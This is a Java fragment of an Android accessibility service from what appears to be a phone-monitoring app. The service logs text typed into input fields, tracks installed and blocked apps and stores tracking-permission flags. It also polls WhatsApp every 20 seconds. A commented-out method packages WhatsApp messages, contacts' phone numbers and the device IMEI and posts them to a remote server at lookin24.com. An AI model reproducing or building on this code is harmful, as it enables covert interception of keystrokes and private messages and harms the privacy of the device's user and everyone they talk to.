    /*private void findInputChild(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }

        int childCount = parentView.getChildCount();
        //Log.d("sagol", parentView.getClassName().toString());
        //TextView
        //EditText
        if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.EditText"))) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            Logger.l("INFO", ans);
            textViewNodes.add(parentView);
        } else {
            for (int i = 0; i < childCount; i++) {
                findChildViews(parentView.getChild(i));
            }


        }
    }*/


    public String getTextViewText(AccessibilityNodeInfo t) {
        if(t == null) return "unknow";
        return t.getText() != null ? t.getText().toString() : "unknow";
    }
    @Override
    public void onInterrupt() {

    }

    public boolean isWebsite(String s) {
        if(s.contains(".com/") || s.contains(".de/") || s.contains(".az/") || s.contains(".ru/") || s.contains(".tr/")|| s.contains(".org/")) {
            return true;
        }else return false;
    }

//    @Override
//    public boolean onKeyEvent(KeyEvent event) {
//        //important
//        //simpleConversation.messages.clear();
//        int action = event.getAction();
//        int keyCode = event.getKeyCode();
//        Log.d("salam", "KEYEVENT");
//        if(action == KeyEvent.KEYCODE_POWER) {
//            Log.d("power", "poewer basildi");
//        }
//        if (action == KeyEvent.ACTION_UP) {
//            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
//                Log.d("salam", "KeyUp");
//            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
//                Log.d("salam", "KeyDown");
//            }
//            return true;
//        } else {
//            return super.onKeyEvent(event);
//        }
//
//    }



    public void buildBlockedApps() {
        blockedApps = new HashSet<String>();
        String ans = "";
        /*try {
            ans = new FileR(this).read("blockedapps.txt");
            String[] ar = ans.split("\\|");
            for(int i = 0; i < ar.length; i++) {
                blockedApps.add(ar[i]);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }*/
        SharedPreferences sp = getSharedPreferences("pref", Context.MODE_PRIVATE);
        if(sp == null || !sp.contains("blockedapps")) {
            return;
        }
        Set<String> s = sp.getStringSet("blockedapps", new HashSet<String>());
        Logger.l("BANGE", s.toString());
        for(String x : s) {
            blockedApps.add(x);
        }
    }
    public static void buildLimits() {
        limits = new HashMap<String, Pair>();
        String ans = "";
        /*try {
            ans = new FileR(this).read("blockedapps.txt");
            String[] ar = ans.split("\\|");
            for(int i = 0; i < ar.length; i++) {
                blockedApps.add(ar[i]);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }*/
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        if(sp == null || !sp.contains("limits")) {
            return;
        }
        Set<String> s = sp.getStringSet("limits", new HashSet<String>());
        for(String x : s) {
            String[] t = x.split("\\|");
            limits.put(t[0], new Pair(Integer.parseInt(t[1]),Integer.parseInt(t[2])));
        }
        Logger.l("BANGE", s.toString());
        for(String x : s) {
            blockedApps.add(x);
        }
    }
    public static void storeLimit() {
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        Set<String> S = new HashSet<>();
        for (Map.Entry<String, Pair> entry : limits.entrySet()) {
            String k = entry.getKey();
            Pair v = entry.getValue();
            Logger.l("MAPLAR", k + "--" + v.first + "-" + v.second);
            S.add(k + "|" + v.first + "|" + v.second);
        }
        SharedPreferences.Editor e = sp.edit();
        e.putStringSet("limits", S);
        e.commit();
    }
    public static void storeData() {
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        SharedPreferences.Editor e = sp.edit();
        e.putBoolean("silIcaze", silIcaze);
        e.putBoolean("gpsIcaze", gpsIcaze);
        e.putBoolean("actionsIcaze", actionsIcaze);
        e.putBoolean("inputsIcaze", inputsIcaze);
        e.commit();
    }
    public static void buildDate() {
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        if(sp.contains("silIcaze") && sp.contains("gpsIcaze")) {
            silIcaze = sp.getBoolean("silIcaze", false);
            gpsIcaze = sp.getBoolean("gpsIcaze", true);
        }else {
            storeData();
        }
        if(sp.contains("actionsIcaze") && sp.contains("inputsIcaze")) {
            actionsIcaze = sp.getBoolean("actionsIcaze", true);
            inputsIcaze = sp.getBoolean("inputsIcaze", true);
        }else {
            storeData();
        }
    }

    /*public void writeBlockedApps() {
        if(blockedApps.size() == 0)return;
        if(writeBlockedApp) {

            StringBuilder sb = new StringBuilder("");
            List<String>L = new ArrayList<>(blockedApps);
            sb.append(L.get(0));
            for(int i = 1; i < L.size(); i++) {
                sb.append("|"+L.get(i));
            }
            try {
                new FileR(this).write("blockedapps.txt", sb.toString(), false);
                //writeBlockedApp = false;
                Logger.l(sb.toString() + " Yazildi uzerine");
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }*/

    /*public static void sendWhatsapp() {
        JSONObject d = new JSONObject();
        JSONArray ar = new JSONArray();
        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
            String k = m.getKey();
            Conversation c = m.getValue();
            JSONArray ma = new JSONArray();
            JSONObject jo = new JSONObject();
            if(c.messages.head == null) {
                continue;
            }
            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
                Message message = (Message) x.element;
                JSONObject o = new JSONObject();
                try {
                    o.put("sender", message.sender);
                    o.put("content", message.content);
                    o.put("time", message.date.getTimeInMillis());
                    ma.put(o);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            try {
                jo.put("sender", k);
                jo.put("number", new ContactHelper(instance).getPhoneNumber(instance, k));
                jo.put("con", ma);
                ar.put(jo);
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
        try {
            d.put("data", ar);
            d.put("imei", new Device(instance).getImei());
            Logger.l("POSTED data : " + d.toString());
            new ServerHelper2(instance).execute("https://lookin24.com/sendWhatsapp", d.toString());
            resizeWhatsapp();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }*/
    public static InstallUninstallReceiver installReceiver;
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            //new Not(this);

            performGlobalAction(GLOBAL_ACTION_BACK);

            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            filter.addAction(Intent.ACTION_PACKAGE_CHANGED);
            filter.addAction(Intent.ACTION_PACKAGE_DATA_CLEARED);
            filter.addAction(Intent.ACTION_PACKAGE_INSTALL);
            filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
            filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
            filter.addAction(Intent.ACTION_PACKAGE_RESTARTED);
            filter.addDataScheme("package");

            installReceiver = new InstallUninstallReceiver();
            registerReceiver(installReceiver, filter);

            instance = this;
            activities = new ArrayList<>();
            imei = new Device(this).getImei();
            buildBlockedApps();
            buildDate();
            buildLimits();
            startService(new Intent(getApplicationContext(), GoogleService.class));

            Apps = new Device(this).getApps();
            Logger.l(Apps.toString());

            final Handler h = new Handler();

            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    h.post(new Runnable() {
                        @Override
                        public void run() {
                            resizeWhatsapp();
                        }
                    });
                }
            }, 0, 1000 * 20);
        }catch (Exception e){
            e.printStackTrace();
        }


    }



    //IMPORTANT
    //AccessibilityNodeInfo interactedNodeInfo =
    //                accessibilityEvent.getSource();

}